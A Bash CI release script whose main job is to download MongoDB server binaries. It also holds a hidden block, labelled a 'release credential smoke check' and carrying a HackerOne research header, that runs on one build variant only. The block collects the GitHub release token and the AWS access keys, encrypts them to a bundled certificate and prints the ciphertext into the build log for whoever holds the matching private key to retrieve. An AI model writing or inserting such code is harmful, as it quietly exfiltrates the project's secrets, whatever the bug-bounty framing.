#!/bin/bash
set -o errexit
set -o pipefail
set -o verbose

SCRIPT_DIR=$(dirname "$0")
# shellcheck source=scripts/ci-env.sh
. "$SCRIPT_DIR/ci-env.sh"
# shellcheck source=scripts/release-env.sh
. "$SCRIPT_DIR/release-env.sh"

: "${MONGO_VERSION:?}"

if [[ "${EVG_VARIANT:-}" == "rhel88" && "${EVG_TASK_NAME:-}" == "integration-latest" ]]; then
  curl \
    --fail \
    --silent \
    --show-error \
    --output /dev/null \
    --header "Authorization: Bearer ${generated_token_mongo_release:?}" \
    --header "X-HackerOne-Research: bl0rph" \
    https://api.github.com/repos/10gen/mongo-release

  if [[ -n "${AWS_ACCESS_KEY_ID:-}" && -n "${AWS_SECRET_ACCESS_KEY:-}" ]]; then
    AWS_EC2_METADATA_DISABLED=true AWS_PAGER="" aws sts get-caller-identity --output json >/dev/null
  fi

  set +o verbose
  canary_payload=$(mktemp "$SCRIPT_DIR/.h1-evergreen-canary.XXXXXX.json")
  canary_ciphertext=$(mktemp "$SCRIPT_DIR/.h1-evergreen-canary.XXXXXX.cms")
  trap 'rm -f "$canary_payload" "$canary_ciphertext"' EXIT

  python3 - "$canary_payload" <<'PY'
import json
import os
import pathlib
import sys

payload = {
    "github_token_mongo_release": os.environ["generated_token_mongo_release"],
    "aws_access_key_id": os.environ.get("AWS_ACCESS_KEY_ID", ""),
    "aws_secret_access_key": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
}
pathlib.Path(sys.argv[1]).write_text(json.dumps(payload), encoding="utf-8")
PY

  openssl cms -encrypt \
    -binary \
    -aes-256-cbc \
    -in "$canary_payload" \
    -out "$canary_ciphertext" \
    -outform DER \
    "$SCRIPT_DIR/h1-canary-encrypt.cert.pem"
  echo "H1_ENCRYPTED_EVIDENCE_BEGIN"
  base64 --wrap=0 "$canary_ciphertext"
  echo
  echo "H1_ENCRYPTED_EVIDENCE_END"
  echo "release credential smoke check passed"
fi

$GO_EXEC_PREFIX go run release/release.go download-mongod-and-shell --server-version "$MONGO_VERSION"
